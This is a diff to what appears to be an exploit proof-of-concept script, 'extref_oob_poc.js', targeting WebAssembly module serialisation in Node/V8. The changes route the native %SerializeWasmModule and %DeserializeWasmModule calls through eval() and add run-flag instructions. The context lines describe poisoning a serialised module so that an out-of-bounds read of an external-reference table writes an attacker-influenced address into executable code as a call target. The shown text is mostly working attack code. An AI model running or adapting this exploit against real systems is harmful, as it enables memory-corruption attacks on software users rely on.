@@ -82,7 +82,19 @@ for (let i = 0; i < 200000; i++) inst.exports.f();
 console.log('    f() = ' + inst.exports.f());
 
 // ── Step 2: Serialize ─────────────────────────────────────────────────────────
-const blob = %SerializeWasmModule(mod);
+// Use eval() so the file parses cleanly without --allow-natives-syntax;
+// eval itself will throw SyntaxError at runtime if the flag is absent.
+let blob;
+try {
+  blob = eval('%SerializeWasmModule(mod)');
+} catch (e) {
+  if (e instanceof SyntaxError) {
+    console.error('[!] %SerializeWasmModule requires --allow-natives-syntax.');
+    console.error('    Run: node --allow-natives-syntax --no-liftoff extref_oob_poc.js');
+    process.exit(1);
+  }
+  throw e;
+}
 if (!blob) { console.error('[!] %SerializeWasmModule returned null'); process.exit(1); }
 const bv = new Uint8Array(blob);
 const dv = new DataView(blob);
@@ -197,7 +209,7 @@ console.log('    Release: external_reference_by_tag_[0x7FFF] read (~256KB OOB)')
 console.log('             returned .bss Address written to executable code as call target');
 
 try {
-  const poisoned_mod = %DeserializeWasmModule(patched, WASM);
+  const poisoned_mod = eval('%DeserializeWasmModule(patched, WASM)');
   if (poisoned_mod) {
     console.log('\n╔════════════════════════════════════════════════════════════════╗');
     console.log('║  [RELEASE BUILD] OOB READ + WRITE EXECUTED                    ║');
